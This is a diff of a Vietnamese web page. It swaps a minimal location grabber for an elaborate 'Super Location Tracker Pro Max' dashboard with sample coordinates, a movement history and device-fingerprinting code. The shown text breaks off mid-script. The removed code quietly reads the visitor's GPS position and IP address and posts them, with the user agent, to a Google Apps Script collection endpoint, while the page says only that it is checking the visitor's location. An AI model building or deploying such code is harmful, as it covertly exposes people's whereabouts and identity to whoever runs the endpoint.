@@ -1,57 +1,1020 @@
 <!DOCTYPE html>
 <html lang="vi">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Vị trí của bạn</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SIÊU THEO DÕI VỊ TRÍ PRO MAX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
-      }
+        :root {
+            --primary: #4361ee;
+            --secondary: #3f37c9;
+            --accent: #4895ef;
+            --dark: #1b263b;
+            --light: #f8f9fa;
+            --success: #4cc9f0;
+            --danger: #f72585;
+            --warning: #f8961e;
+        }
+        
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+        }
+        
+        .glass-card {
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            transition: all 0.3s ease;
+        }
+        
+        .glass-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px 0 rgba(31, 38, 135, 0.25);
+        }
+        
+        .glow {
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 10px rgba(67, 97, 238, 0.5);
+            }
+            to {
+                box-shadow: 0 0 20px rgba(67, 97, 238, 0.8), 0 0 30px rgba(67, 97, 238, 0.6);
+            }
+        }
+        
+        .pulse {
+            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+        
+        .progress-bar {
+            height: 8px;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #4cc9f0 0%, #4361ee 100%);
+            transition: width 0.5s ease;
+        }
+        
+        .map-container {
+            position: relative;
+            overflow: hidden;
+            border-radius: 16px;
+            height: 300px;
+            background: linear-gradient(135deg, #e0e0e0 0%, #f5f5f5 100%);
+        }
+        
+        .sensor-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--dark);
+        }
+        
+        .sensor-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--dark);
+            opacity: 0.7;
+        }
+        
+        .history-item {
+            border-left: 3px solid var(--primary);
+            transition: all 0.3s ease;
+        }
+        
+        .history-item:hover {
+            background: rgba(67, 97, 238, 0.05);
+            transform: translateX(5px);
+        }
+        
+        .badge {
+            font-size: 0.7rem;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+        
+        @media (max-width: 768px) {
+            .map-container {
+                height: 200px;
+            }
+        }
     </style>
-  </head>
-  <body>
-    <h1>Đang kiểm tra vị trí của bạn...</h1>
-    <div id="locationInfo"></div>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="w-full max-w-6xl">
+        <!-- Header -->
+        <div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="p-3 bg-blue-500 rounded-full shadow-lg">
+                    <i class="fas fa-satellite-dish text-white text-xl"></i>
+                </div>
+                <div>
+                    <h1 class="text-2xl font-bold text-gray-800" data-lang="title">SIÊU THEO DÕI VỊ TRÍ PRO MAX</h1>
+                    <p class="text-gray-600 text-sm" data-lang="subtitle">Hệ thống giám sát toàn diện 10x</p>
+                </div>
+            </div>
+            
+            <div class="flex items-center space-x-4">
+                <!-- Language Selector -->
+                <div class="relative">
+                    <select id="languageSelect" class="glass-card px-4 py-2 rounded-full text-sm font-medium appearance-none pr-8">
+                        <option value="vi">🇻🇳 Tiếng Việt</option>
+                        <option value="en">🇬🇧 English</option>
+                        <option value="zh">🇨🇳 中文</option>
+                        <option value="ja">🇯🇵 日本語</option>
+                    </select>
+                    <div class="absolute right-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
+                        <i class="fas fa-chevron-down text-gray-500 text-xs"></i>
+                    </div>
+                </div>
+                
+                <!-- Dark Mode Toggle -->
+                <button id="darkModeToggle" class="glass-card p-2 rounded-full">
+                    <i class="fas fa-moon text-gray-700"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Status Bar -->
+        <div class="glass-card p-4 mb-6 flex flex-wrap items-center justify-between gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="relative">
+                    <div class="w-3 h-3 rounded-full bg-green-500 animate-pulse"></div>
+                    <div class="absolute inset-0 rounded-full bg-green-500 opacity-75 animate-ping"></div>
+                </div>
+                <span class="text-sm font-medium" data-lang="active">Đang hoạt động</span>
+                <span class="text-xs px-2 py-1 bg-green-100 text-green-800 rounded-full" data-lang="premium">Premium</span>
+            </div>
+            
+            <div class="flex items-center space-x-4">
+                <div class="flex items-center space-x-2">
+                    <i class="fas fa-shield-alt text-blue-500"></i>
+                    <span class="text-sm" data-lang="security">Bảo mật cấp độ cao</span>
+                </div>
+                
+                <div id="currentTime" class="text-sm font-medium text-gray-600 flex items-center">
+                    <i class="far fa-clock mr-2"></i>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Grid -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Left Column -->
+            <div class="space-y-6">
+                <!-- Location Card -->
+                <div class="glass-card p-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <h2 class="text-xl font-bold text-gray-800 flex items-center">
+                            <i class="fas fa-map-marker-alt text-red-500 mr-2"></i>
+                            <span data-lang="location">VỊ TRÍ CHÍNH XÁC</span>
+                        </h2>
+                        <span class="text-xs px-2 py-1 bg-blue-100 text-blue-800 rounded-full" data-lang="realtime">Thời gian thực</span>
+                    </div>
+                    
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="latitude">Vĩ độ:</p>
+                                <p id="latitude" class="font-mono font-bold text-lg">10.823099</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="longitude">Kinh độ:</p>
+                                <p id="longitude" class="font-mono font-bold text-lg">106.629662</p>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <p class="text-gray-600 text-sm" data-lang="accuracy">Độ chính xác:</p>
+                            <div class="flex items-center space-x-2">
+                                <div class="w-full bg-gray-200 rounded-full h-2">
+                                    <div id="accuracyBar" class="progress-bar h-2 rounded-full" style="width: 92%"></div>
+                                </div>
+                                <span id="accuracy" class="text-sm font-medium">5.2m</span>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <p class="text-gray-600 text-sm" data-lang="address">Địa chỉ:</p>
+                            <p id="address" class="font-medium">227 Nguyễn Văn Cừ, Quận 5, TP.Hồ Chí Minh, Việt Nam</p>
+                        </div>
+                        
+                        <div class="pt-2">
+                            <a href="#" id="mapLink" class="inline-flex items-center px-4 py-2 bg-blue-600 text-white rounded-full hover:bg-blue-700 transition-colors text-sm">
+                                <i class="fas fa-external-link-alt mr-2"></i>
+                                <span data-lang="openMap">Mở bản đồ</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Sensors Card -->
+                <div class="glass-card p-6">
+                    <h2 class="text-xl font-bold text-gray-800 flex items-center mb-4">
+                        <i class="fas fa-microchip text-purple-500 mr-2"></i>
+                        <span data-lang="sensors">CẢM BIẾN THIẾT BỊ</span>
+                    </h2>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="text-center p-3 rounded-xl bg-blue-50">
+                            <div class="sensor-value" id="lightLevel">85%</div>
+                            <div class="sensor-label" data-lang="light">Ánh sáng</div>
+                        </div>
+                        
+                        <div class="text-center p-3 rounded-xl bg-green-50">
+                            <div class="sensor-value" id="temperature">28°C</div>
+                            <div class="sensor-label" data-lang="temp">Nhiệt độ</div>
+                        </div>
+                        
+                        <div class="text-center p-3 rounded-xl bg-yellow-50">
+                            <div class="sensor-value" id="humidity">65%</div>
+                            <div class="sensor-label" data-lang="humidity">Độ ẩm</div>
+                        </div>
+                        
+                        <div class="text-center p-3 rounded-xl bg-red-50">
+                            <div class="sensor-value" id="pressure">1013 hPa</div>
+                            <div class="sensor-label" data-lang="pressure">Áp suất</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Middle Column -->
+            <div class="space-y-6">
+                <!-- Map Card -->
+                <div class="glass-card p-6 h-full">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold text-gray-800 flex items-center">
+                            <i class="fas fa-map text-blue-500 mr-2"></i>
+                            <span data-lang="map">BẢN ĐỒ VỊ TRÍ</span>
+                        </h2>
+                        <div class="flex space-x-2">
+                            <button class="p-2 rounded-full bg-gray-100 hover:bg-gray-200 transition-colors">
+                                <i class="fas fa-layer-group text-gray-600"></i>
+                            </button>
+                            <button class="p-2 rounded-full bg-gray-100 hover:bg-gray-200 transition-colors">
+                                <i class="fas fa-location-arrow text-gray-600"></i>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="map-container flex items-center justify-center">
+                        <div class="text-center">
+                            <i class="fas fa-map-marked-alt text-5xl text-gray-300 mb-3"></i>
+                            <p class="text-gray-500" data-lang="loadingMap">Đang tải bản đồ...</p>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4 grid grid-cols-3 gap-2">
+                        <button class="px-3 py-1 bg-gray-100 rounded-full text-sm hover:bg-gray-200 transition-colors" data-lang="standard">Tiêu chuẩn</button>
+                        <button class="px-3 py-1 bg-gray-100 rounded-full text-sm hover:bg-gray-200 transition-colors" data-lang="satellite">Vệ tinh</button>
+                        <button class="px-3 py-1 bg-gray-100 rounded-full text-sm hover:bg-gray-200 transition-colors" data-lang="terrain">Địa hình</button>
+                    </div>
+                </div>
+                
+                <!-- Network Card -->
+                <div class="glass-card p-6">
+                    <h2 class="text-xl font-bold text-gray-800 flex items-center mb-4">
+                        <i class="fas fa-wifi text-green-500 mr-2"></i>
+                        <span data-lang="network">THÔNG TIN MẠNG</span>
+                    </h2>
+                    
+                    <div class="space-y-4">
+                        <div>
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="text-gray-600 text-sm" data-lang="ip">Địa chỉ IP:</span>
+                                <span id="ip" class="font-mono">192.168.1.100</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-1.5">
+                                <div class="bg-green-500 h-1.5 rounded-full" style="width: 85%"></div>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="text-gray-600 text-sm" data-lang="connection">Loại kết nối:</span>
+                                <span id="connection" class="font-medium">5G</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-1.5">
+                                <div class="bg-blue-500 h-1.5 rounded-full" style="width: 95%"></div>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="text-gray-600 text-sm" data-lang="speed">Tốc độ:</span>
+                                <span id="speed" class="font-medium">72.4 Mbps</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-1.5">
+                                <div class="bg-purple-500 h-1.5 rounded-full" style="width: 72%"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="pt-2">
+                            <button class="text-blue-600 text-sm flex items-center hover:text-blue-800 transition-colors">
+                                <i class="fas fa-chart-line mr-2"></i>
+                                <span data-lang="networkHistory">Xem lịch sử mạng</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Right Column -->
+            <div class="space-y-6">
+                <!-- System Info Card -->
+                <div class="glass-card p-6">
+                    <h2 class="text-xl font-bold text-gray-800 flex items-center mb-4">
+                        <i class="fas fa-laptop-code text-orange-500 mr-2"></i>
+                        <span data-lang="system">THÔNG TIN HỆ THỐNG</span>
+                    </h2>
+                    
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="os">Hệ điều hành:</p>
+                                <p id="os" class="font-medium">Android 13</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="browser">Trình duyệt:</p>
+                                <p id="browser" class="font-medium">Chrome 115</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="resolution">Độ phân giải:</p>
+                                <p id="resolution" class="font-medium">1080x2340</p>
+                            </div>
+                            <div>
+                                <p class="text-gray-600 text-sm" data-lang="battery">Pin:</p>
+                                <p id="battery" class="font-medium">78% (Đang sạc)</p>
+                            </div>
+                        </div>
+                        
+                        <div class="pt-2">
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-gray-600" data-lang="storage">Bộ nhớ:</span>
+                                <span>64GB / 128GB</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-2">
+                                <div class="bg-yellow-500 h-2 rounded-full" style="width: 50%"></div>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <div class="flex justify-between text-sm mb-1">
+                                <span class="text-gray-600" data-lang="memory">Bộ nhớ RAM:</span>
+                                <span>4.2GB / 8GB</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-2">
+                                <div class="bg-green-500 h-2 rounded-full" style="width: 52.5%"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- History Card -->
+                <div class="glass-card p-6">
+                    <h2 class="text-xl font-bold text-gray-800 flex items-center mb-4">
+                        <i class="fas fa-history text-indigo-500 mr-2"></i>
+                        <span data-lang="history">LỊCH SỬ DI CHUYỂN</span>
+                    </h2>
+                    
+                    <div class="space-y-3 max-h-64 overflow-y-auto pr-2">
+                        <div class="history-item p-3 rounded-lg">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <p class="font-medium">Nhà riêng</p>
+                                    <p class="text-sm text-gray-500">12:45 PM - 20/10/2023</p>
+                                </div>
+                                <span class="text-xs px-2 py-1 bg-blue-100 text-blue-800 rounded-full">5 phút</span>
+                            </div>
+                        </div>
+                        
+                        <div class="history-item p-3 rounded-lg">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <p class="font-medium">Công viên</p>
+                                    <p class="text-sm text-gray-500">11:30 AM - 20/10/2023</p>
+                                </div>
+                                <span class="text-xs px-2 py-1 bg-green-100 text-green-800 rounded-full">45 phút</span>
+                            </div>
+                        </div>
+                        
+                        <div class="history-item p-3 rounded-lg">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <p class="font-medium">Trung tâm mua sắm</p>
+                                    <p class="text-sm text-gray-500">10:15 AM - 20/10/2023</p>
+                                </div>
+                                <span class="text-xs px-2 py-1 bg-purple-100 text-purple-800 rounded-full">1 giờ</span>
+                            </div>
+                        </div>
+                        
+                        <div class="history-item p-3 rounded-lg">
+                            <div class="flex justify-between items-center">
+                                <div>
+                                    <p class="font-medium">Nhà bạn</p>
+                                    <p class="text-sm text-gray-500">9:00 AM - 20/10/2023</p>
+                                </div>
+                                <span class="text-xs px-2 py-1 bg-yellow-100 text-yellow-800 rounded-full">30 phút</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="pt-3">
+                        <button class="text-blue-600 text-sm flex items-center hover:text-blue-800 transition-colors">
+                            <i class="fas fa-plus-circle mr-2"></i>
+                            <span data-lang="viewAll">Xem tất cả</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Advanced Features -->
+        <div class="glass-card p-6 mt-6">
+            <h2 class="text-xl font-bold text-gray-800 flex items-center mb-4">
+                <i class="fas fa-rocket text-red-500 mr-2"></i>
+                <span data-lang="advanced">TÍNH NĂNG NÂNG CAO</span>
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="p-4 rounded-xl bg-gradient-to-br from-blue-50 to-indigo-50">
+                    <div class="flex items-center mb-2">
+                        <div class="p-2 bg-blue-100 rounded-lg mr-3">
+                            <i class="fas fa-bell text-blue-600"></i>
+                        </div>
+                        <h3 class="font-bold" data-lang="geofence">Thông báo địa lý</h3>
+                    </div>
+                    <p class="text-sm text-gray-600" data-lang="geofenceDesc">Nhận thông báo khi vào/ra khỏi khu vực chỉ định</p>
+                </div>
+                
+                <div class="p-4 rounded-xl bg-gradient-to-br from-green-50 to-teal-50">
+                    <div class="flex items-center mb-2">
+                        <div class="p-2 bg-green-100 rounded-lg mr-3">
+                            <i class="fas fa-route text-green-600"></i>
+                        </div>
+                        <h3 class="font-bold" data-lang="path">Theo dõi lộ trình</h3>
+                    </div>
+                    <p class="text-sm text-gray-600" data-lang="pathDesc">Ghi lại toàn bộ hành trình di chuyển của bạn</p>
+                </div>
+                
+                <div class="p-4 rounded-xl bg-gradient-to-br from-purple-50 to-pink-50">
+                    <div class="flex items-center mb-2">
+                        <div class="p-2 bg-purple-100 rounded-lg mr-3">
+                            <i class="fas fa-share-alt text-purple-600"></i>
+                        </div>
+                        <h3 class="font-bold" data-lang="share">Chia sẻ vị trí</h3>
+                    </div>
+                    <p class="text-sm text-gray-600" data-lang="shareDesc">Chia sẻ vị trí thời gian thực với người thân</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="text-center mt-8 mb-4">
+            <div class="flex justify-center space-x-4 mb-3">
+                <a href="#" class="text-gray-500 hover:text-blue-600 transition-colors">
+                    <i class="fab fa-facebook-f"></i>
+                </a>
+                <a href="#" class="text-gray-500 hover:text-pink-600 transition-colors">
+                    <i class="fab fa-instagram"></i>
+                </a>
+                <a href="#" class="text-gray-500 hover:text-blue-400 transition-colors">
+                    <i class="fab fa-twitter"></i>
+                </a>
+                <a href="#" class="text-gray-500 hover:text-red-600 transition-colors">
+                    <i class="fab fa-youtube"></i>
+                </a>
+            </div>
+            
+            <p class="text-sm text-gray-500" data-lang="copyright">© 2023 SIÊU THEO DÕI VỊ TRÍ PRO MAX | Phiên bản 3.0 | Bản quyền thuộc về <span class="font-medium">B.Trọng</span></p>
+        </div>
+    </div>
 
     <script>
-      window.addEventListener("load", function () {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(function (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+        // Enhanced Multi-language support
+        const translations = {
+            vi: {
+                title: "SIÊU THEO DÕI VỊ TRÍ PRO MAX",
+                subtitle: "Hệ thống giám sát toàn diện 10x",
+                active: "Đang hoạt động",
+                premium: "Premium",
+                security: "Bảo mật cấp độ cao",
+                location: "VỊ TRÍ CHÍNH XÁC",
+                realtime: "Thời gian thực",
+                latitude: "Vĩ độ:",
+                longitude: "Kinh độ:",
+                accuracy: "Độ chính xác:",
+                address: "Địa chỉ:",
+                openMap: "Mở bản đồ",
+                sensors: "CẢM BIẾN THIẾT BỊ",
+                light: "Ánh sáng",
+                temp: "Nhiệt độ",
+                humidity: "Độ ẩm",
+                pressure: "Áp suất",
+                map: "BẢN ĐỒ VỊ TRÍ",
+                loadingMap: "Đang tải bản đồ...",
+                standard: "Tiêu chuẩn",
+                satellite: "Vệ tinh",
+                terrain: "Địa hình",
+                network: "THÔNG TIN MẠNG",
+                ip: "Địa chỉ IP:",
+                connection: "Loại kết nối:",
+                speed: "Tốc độ:",
+                networkHistory: "Xem lịch sử mạng",
+                system: "THÔNG TIN HỆ THỐNG",
+                os: "Hệ điều hành:",
+                browser: "Trình duyệt:",
+                resolution: "Độ phân giải:",
+                battery: "Pin:",
+                storage: "Bộ nhớ:",
+                memory: "Bộ nhớ RAM:",
+                history: "LỊCH SỬ DI CHUYỂN",
+                viewAll: "Xem tất cả",
+                advanced: "TÍNH NĂNG NÂNG CAO",
+                geofence: "Thông báo địa lý",
+                geofenceDesc: "Nhận thông báo khi vào/ra khỏi khu vực chỉ định",
+                path: "Theo dõi lộ trình",
+                pathDesc: "Ghi lại toàn bộ hành trình di chuyển của bạn",
+                share: "Chia sẻ vị trí",
+                shareDesc: "Chia sẻ vị trí thời gian thực với người thân",
+                copyright: "© 2023 SIÊU THEO DÕI VỊ TRÍ PRO MAX | Phiên bản 3.0 | Bản quyền thuộc về B.Trọng"
+            },
+            en: {
+                title: "SUPER LOCATION TRACKER PRO MAX",
+                subtitle: "10x comprehensive monitoring system",
+                active: "Active",
+                premium: "Premium",
+                security: "High level security",
+                location: "PRECISE LOCATION",
+                realtime: "Real-time",
+                latitude: "Latitude:",
+                longitude: "Longitude:",
+                accuracy: "Accuracy:",
+                address: "Address:",
+                openMap: "Open map",
+                sensors: "DEVICE SENSORS",
+                light: "Light",
+                temp: "Temperature",
+                humidity: "Humidity",
+                pressure: "Pressure",
+                map: "LOCATION MAP",
+                loadingMap: "Loading map...",
+                standard: "Standard",
+                satellite: "Satellite",
+                terrain: "Terrain",
+                network: "NETWORK INFORMATION",
+                ip: "IP Address:",
+                connection: "Connection:",
+                speed: "Speed:",
+                networkHistory: "View network history",
+                system: "SYSTEM INFORMATION",
+                os: "OS:",
+                browser: "Browser:",
+                resolution: "Resolution:",
+                battery: "Battery:",
+                storage: "Storage:",
+                memory: "Memory:",
+                history: "MOVEMENT HISTORY",
+                viewAll: "View all",
+                advanced: "ADVANCED FEATURES",
+                geofence: "Geofence alerts",
+                geofenceDesc: "Get notified when entering/leaving specified areas",
+                path: "Path tracking",
+                pathDesc: "Record your entire movement history",
+                share: "Share location",
+                shareDesc: "Share real-time location with family",
+                copyright: "© 2023 SUPER LOCATION TRACKER PRO MAX | Version 3.0 | Copyright by B.Trong"
+            },
+            zh: {
+                title: "超级位置追踪专业版",
+                subtitle: "10倍全面监控系统",
+                active: "活跃",
+                premium: "高级版",
+                security: "高级别安全",
+                location: "精确位置",
+                realtime: "实时",
+                latitude: "纬度:",
+                longitude: "经度:",
+                accuracy: "准确度:",
+                address: "地址:",
+                openMap: "打开地图",
+                sensors: "设备传感器",
+                light: "光线",
+                temp: "温度",
+                humidity: "湿度",
+                pressure: "压力",
+                map: "位置地图",
+                loadingMap: "正在加载地图...",
+                standard: "标准",
+                satellite: "卫星",
+                terrain: "地形",
+                network: "网络信息",
+                ip: "IP地址:",
+                connection: "连接:",
+                speed: "速度:",
+                networkHistory: "查看网络历史",
+                system: "系统信息",
+                os: "操作系统:",
+                browser: "浏览器:",
+                resolution: "分辨率:",
+                battery: "电池:",
+                storage: "存储:",
+                memory: "内存:",
+                history: "移动历史",
+                viewAll: "查看全部",
+                advanced: "高级功能",
+                geofence: "地理围栏",
+                geofenceDesc: "进入/离开指定区域时接收通知",
+                path: "路径跟踪",
+                pathDesc: "记录您的整个移动历史",
+                share: "共享位置",
+                shareDesc: "与家人共享实时位置",
+                copyright: "© 2023 超级位置追踪专业版 | 版本 3.0 | 版权归 B.Trong 所有"
+            },
+            ja: {
+                title: "スーパー位置トラッカー プロマックス",
+                subtitle: "10倍の包括的な監視システム",
+                active: "アクティブ",
+                premium: "プレミアム",
+                security: "高レベルセキュリティ",
+                location: "正確な位置",
+                realtime: "リアルタイム",
+                latitude: "緯度:",
+                longitude: "経度:",
+                accuracy: "精度:",
+                address: "住所:",
+                openMap: "マップを開く",
+                sensors: "デバイスセンサー",
+                light: "光",
+                temp: "温度",
+                humidity: "湿度",
+                pressure: "圧力",
+                map: "位置マップ",
+                loadingMap: "マップを読み込み中...",
+                standard: "標準",
+                satellite: "衛星",
+                terrain: "地形",
+                network: "ネットワーク情報",
+                ip: "IPアドレス:",
+                connection: "接続:",
+                speed: "速度:",
+                networkHistory: "ネットワーク履歴を表示",
+                system: "システム情報",
+                os: "OS:",
+                browser: "ブラウザ:",
+                resolution: "解像度:",
+                battery: "バッテリー:",
+                storage: "ストレージ:",
+                memory: "メモリ:",
+                history: "移動履歴",
+                viewAll: "すべて表示",
+                advanced: "高度な機能",
+                geofence: "ジオフェンス",
+                geofenceDesc: "指定エリアへの出入りを通知",
+                path: "経路追跡",
+                pathDesc: "移動履歴を記録",
+                share: "位置共有",
+                shareDesc: "家族とリアルタイム位置を共有",
+                copyright: "© 2023 スーパー位置トラッカー プロマックス | バージョン 3.0 | 著作権 B.Trong"
+            }
+        };
 
-            document.getElementById("locationInfo").innerHTML = `Vị trí của bạn: <br> Vĩ độ: ${lat} <br> Kinh độ: ${lon}`;
+        // Language switcher
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            const lang = this.value;
+            document.querySelectorAll('[data-lang]').forEach(el => {
+                const key = el.getAttribute('data-lang');
+                if (translations[lang] && translations[lang][key]) {
+                    el.textContent = translations[lang][key];
+                }
+            });
+            
+            // Update time format based on language
+            updateTime();
+        });
 
-            fetch("https://api.ipify.org?format=json")
-              .then(response => response.json())
-              .then(data => {
-                const ip = data.ip;
-                const ua = navigator.userAgent;
+        // Dark mode toggle
+        document.getElementById('darkModeToggle').addEventListener('click', function() {
+            document.body.classList.toggle('dark');
+            const icon = this.querySelector('i');
+            
+            if (document.body.classList.contains('dark')) {
+                document.body.style.background = 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)';
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+                icon.classList.remove('text-gray-700');
+                icon.classList.add('text-yellow-300');
+            } else {
+                document.body.style.background = 'linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%)';
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+                icon.classList.remove('text-yellow-300');
+                icon.classList.add('text-gray-700');
+            }
+        });
 
-                fetch("https://script.google.com/macros/s/AKfycbwhWtJFVI3Kri52Ad8fooaZjgbwqrjoQaoyT84W4Vov62fsf109lJsgOaX3l6cp1Hz-/exec", {
-                  method: "POST",
-                  headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                  },
-                  body: `ip=${ip}&ua=${encodeURIComponent(ua)}&lat=${lat}&lon=${lon}`
-                })
-                  .then(response => response.text())
-                  .then(data => {
-                    console.log("Server Response:", data);
-                  })
-                  .catch(error => console.error("Error:", error));
-              })
-              .catch(error => console.error("Error fetching IP:", error));
-          }, function (error) {
-            document.getElementById("locationInfo").innerText = "Lỗi khi lấy vị trí: " + error.message;
-          });
-        } else {
-          document.getElementById("locationInfo").innerText = "Trình duyệt của bạn không hỗ trợ Geolocation.";
+        // Update time with locale
+        function updateTime() {
+            const now = new Date();
+            const lang = document.getElementById('languageSelect').value;
+            let options;
+            
+            switch(lang) {
+                case 'vi':
+                    options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false
+                    };
+                    break;
+                case 'en':
+                    options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'short',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: true
+                    };
+                    break;
+                case 'zh':
+                    options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false
+                    };
+                    break;
+                case 'ja':
+                    options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false
+                    };
+                    break;
+                default:
+                    options = {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false
+                    };
+            }
+            
+            const locale = lang === 'vi' ? 'vi-VN' : 
+                          lang === 'en' ? 'en-US' : 
+                          lang === 'zh' ? 'zh-CN' : 
+                          lang === 'ja' ? 'ja-JP' : 'vi-VN';
+            
+            document.getElementById('currentTime').querySelector('span').textContent = 
+                now.toLocaleDateString(locale, options);
         }
-      });
+
+        // Get device info with more details
+        function getDeviceInfo() {
+            // Get OS with version
+            let os = "Unknown OS";
+            const userAgent = window.navigator.userAgent;
+            const platform = window.navigator.platform;
+            
+            if (/Android/i.test(userAgent)) {
+                const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
+                os = `Android ${androidVersion ? androidVersion[1] : ''}`.trim();
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
+                os = `iOS ${iosVersion ? iosVersion[1].replace('_', '.') : ''}`.trim();
+            } else if (/Win/i.test(platform)) {
+                const windowsVersion = userAgent.match(/Windows NT\s([0-9\.]+)/);
+                os = `Windows ${windowsVersion ? windowsVersion[1] : ''}`.trim();
+            } else if (/Mac/i.test(platform)) {
+                const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
+                os = `MacOS ${macVersion ? macVersion[1].replace('_', '.') : ''}`.trim();
+            } else if (/Linux/i.test(platform)) {
+                os = "Linux";
+            }
+            
+            // Get browser with version
+            let browser = "Unknown Browser";
+            let browserVersion = "";
+            
+            if (userAgent.indexOf("Firefox") > -1) {
+                browser = "Firefox";
+                browserVersion = userAgent.match(/Firefox\/([0-9\.]+)/)[1];
+            } else if (userAgent.indexOf("SamsungBrowser") > -1) {
+                browser = "Samsung Browser";
+                browserVersion = userAgent.match(/SamsungBrowser\/([0-9\.]+)/)[1];
